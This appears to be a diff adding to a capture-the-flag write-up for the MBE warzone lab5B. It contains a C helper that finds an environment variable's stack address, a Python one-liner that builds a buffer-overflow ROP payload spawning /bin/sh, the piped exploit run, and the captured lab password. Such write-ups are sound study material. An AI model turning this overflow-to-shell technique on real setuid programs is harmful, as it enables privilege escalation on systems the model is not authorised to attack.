@@ -1518,4 +1518,47 @@ execve(0x41414141, [0], [/* 0 vars */]) = -1 EFAULT (Bad address)
 Segmentation fault (core dumped)
 ```
 
-OK. We landed in our payload so far but at an address to high on stack (an an lower address we actually need). So let's add 64 to it and repeat
+OK. We landed in our payload so far but at an address to high on stack (an an lower address we actually need). This time I will introduce a far more elegant way to find right spot to our argument. A far more sophisticated way I think. The only drawback here is, that this method will only work i you have writable access to any directory and (far most restrictive) a C-compiler on board. There's a function called ```getenv()``` provided by libc, which allows us to search list of environment variables provided in user-space by its name and grab address on stack to it.
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+char *ptr;
+
+if (argc < 3) {
+        printf("Usage: %s <env var name> <target program name>", argv[0]);
+        exit(0);
+}
+
+ptr=getenv(argv[1]);
+ptr+=(strlen(argv[0])-strlen(argv[2]))*2;
+printf("%s will be at %p\n",argv[1], ptr);
+return 0;
+}
+```
+ The calculation respects the fact, that address to environment variable will be subtrected by two bytes for every character thats gets appended to program's name.
+
+ ```
+$ export SH=/bin/sh
+$ ./getenvaddr SH /levels/lab05/lab5B
+SH will be at 0xbffffe7c
+$ ./getenvaddr SH /levels/lab05/lab5B
+$ python -c 'print "A"*132 + "/bin/sh\x00" + "\x86\x87\x05\x08" + "\x7c\xfe\xff\xbf" + "\xad\x55\x0e\x08" + "\x00"*4 + "\xe2\xea\x08\x08" + "\x00"*4 +"\x1f\xf3\x06\x08"' > /tmp/pwn
+lab5B@warzone:/tmp$ (cat /tmp/pwn; cat) | /levels/lab05/lab5B
+Insert ROP chain here:
+whoami
+lab5A
+cat /home/lab5A/.pass
+th4ts_th3_r0p_i_lik3_2_s33
+```
+
+## Pass Lab5B
+```
+th4ts_th3_r0p_i_lik3_2_s33
+```
+
+
